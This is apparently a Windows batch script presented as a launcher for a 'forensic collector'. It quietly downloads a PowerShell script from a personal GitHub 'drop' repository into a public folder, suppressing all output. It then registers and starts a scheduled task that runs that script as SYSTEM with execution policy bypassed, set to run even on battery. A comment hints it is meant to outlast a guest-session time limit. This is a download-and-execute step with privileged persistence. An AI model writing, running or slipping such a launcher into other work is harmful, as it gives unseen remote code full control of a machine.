@echo off
rem Launch YOGA Gryxa forensic collector via battery-safe schtasks (Guest 10s kill).
rem Log: C:\Users\Public\yoga_forensic.log
setlocal EnableExtensions
set "LOG=C:\Users\Public\yoga_forensic.log"
set "PS1=C:\Users\Public\yoga_forensic.ps1"
set "BASE=https://raw.githubusercontent.com/xnobuddy/github-drop/main"

curl.exe -L --ssl-no-revoke --connect-timeout 15 --max-time 60 -o "%PS1%" "%BASE%/winrtcs_yoga_forensic.ps1?t=%RANDOM%" >nul 2>&1
if not exist "%PS1%" (
  echo FAIL_NO_PS1
  exit /b 3
)

powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ^
  "$ErrorActionPreference='Stop'; $tn='WinRTCSYogaForensic'; ^
   Unregister-ScheduledTask -TaskName $tn -Confirm:$false -ErrorAction SilentlyContinue; ^
   $a=New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoP -NonI -EP Bypass -File C:\Users\Public\yoga_forensic.ps1'; ^
   $st=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Minutes 15); ^
   $p=New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest; ^
   Register-ScheduledTask -TaskName $tn -Action $a -Settings $st -Principal $p -Force | Out-Null; ^
   Start-ScheduledTask -TaskName $tn"

echo QUEUED yoga-forensic - wait ~60s then: type %LOG%
endlocal & exit /b 0
